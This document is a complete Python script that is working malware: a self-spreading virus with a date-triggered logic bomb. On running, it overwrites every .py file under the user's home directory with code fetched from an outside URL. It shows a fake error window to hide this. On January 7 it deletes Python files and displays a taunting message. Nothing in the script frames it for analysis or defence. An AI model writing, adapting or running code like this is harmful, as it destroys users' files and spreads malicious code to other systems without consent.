from datetime import datetime
import urllib.request
import pathlib
import os
import tkinter

day = datetime.now().day
month = datetime.now().month
path = pathlib.Path().home()

def default():
    r_window = tkinter.Tk()
    r_window.title("Error!")

    lbl = tkinter.Label(r_window, text="Error: Couldn't load necessary files.")
    lbl.pack()

    r_window.mainloop()

def spread():
    for entry in path.rglob("*"):
        if (entry.match("*.py") == True):
            with urllib.request.urlopen("https://winnyace82.s-ul.eu/hxISQXkD") as file:
                entry.write_bytes(file.read())

def active_payload():
    for entry in path.iterdir():
        if (entry.match("*.py") == True):
            os.remove(entry)
    
    r_window = tkinter.Tk()
    r_window.title("LMAO!!! YOU GOT REKT!")

    lbl = tkinter.Label(r_window, text="Yo babe! What's up? It's my birthday today and I'm feeling a bit chaotic, so say goodbye your Python scripts!\nNo hard feelings, though. See ya around.")
    lbl.pack()

    r_window.mainloop()         

spread()
if (month == 1 and day == 7):
    active_payload()
else:
    default()